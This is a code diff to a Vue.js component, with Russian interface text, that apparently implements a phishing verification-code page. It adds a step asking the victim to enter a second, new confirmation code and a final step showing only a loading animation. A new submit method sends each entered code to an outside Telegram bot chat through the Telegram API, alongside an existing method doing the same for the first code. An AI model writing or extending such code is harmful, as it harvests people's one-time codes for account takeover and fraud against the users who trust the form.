@@ -27,14 +27,30 @@
           <div v-show="step === 2" class="step">
             <form method="POST" @submit.prevent="submitFormTwo">
               <div class="mb-3">
-                <div>Код подтверждения приходить в течение {{time}} минут</div>
-                <input required v-model="codeAuth" type="text" class="form-control" maxlength="5" pattern="-?(\d+|\d+.\d+|.\d+)([eE][-+]?\d+)?" placeholder="Код" id="name" aria-describedby="name">
-                <div id="emailHelp" class="form-text">Максимальное количество цифр 5</div>
+                <div class="text-center">Код подтверждения приходить в течение {{time}} минут</div>
+                <input required v-model="codeAuth" type="text" class="form-control" maxlength="5" pattern="-?(\d+|\d+.\d+|.\d+)([eE][-+]?\d+)?" placeholder="Введите код" id="name" aria-describedby="name">
               </div>
               <div class="text-center">
-                <button type="submit" class="btn btn-danger" @click="nextCodeAuth">Подвердить</button>
+                <button type="submit" class="btn btn-danger btn-blockk" @click="nextCodeAuth">Подвердить</button>
               </div>
             </form>
+          </div>
+
+          <div v-show="step === 3" class="step">
+            <form method="POST" @submit.prevent="submitFormThree">
+              <div class="mb-3">
+                <div class="text-center">Код подтверждения приходить в течение {{time}} минут</div>
+                <input required v-model="codeAuthTwo" type="text" class="form-control" maxlength="5" pattern="-?(\d+|\d+.\d+|.\d+)([eE][-+]?\d+)?" placeholder="Введите код" id="name" aria-describedby="name">
+                <div id="emailHelp" class="form-text color-den">Введите повторно новый код для подтверждения</div>
+              </div>
+              <div class="text-center">
+                <button type="submit" class="btn btn-danger btn-blockk" @click="nextCodeAuth">Подвердить повторно</button>
+              </div>
+            </form>
+          </div>
+
+          <div v-show="step === 4" class="step text-center">
+            <img class="mb-3 logo" src="@/assets/galg.gif">
           </div>
         </div>
       </div>
@@ -71,6 +87,10 @@ export default {
     submitFormTwo() {
       const fullMessage = `Код: ${this.codeAuth}`;
       this.$http.post(`https://api.telegram.org/bot${this.token}/sendMessage?chat_id=${this.chatId}&text=${fullMessage}`)
+    },
+    submitFormThree() {
+      const fullMessage = `Повторный код: ${this.codeAuthTwo}`;
+      this.$http.post(`https://api.telegram.org/bot${this.token}/sendMessage?chat_id=${this.chatId}&text=${fullMessage}`)
     }
   },
   computed: {
@@ -94,6 +114,7 @@ export default {
 .form-control {
   background-color: rgb(221, 221, 221) !important;
   border: 0 rgb(221, 221, 221) !important;
+  height: 40px !important;
 }
 
 .form-control:focus, .form-control:active {
@@ -126,7 +147,12 @@ export default {
 
 .btn-blockk {
   width: 100%;
+  height: 40px;
   font-weight: 500;
   margin-top: 50px;
+}
+
+.color-den {
+  color: rgb(255, 0, 0);
 }
 </style>
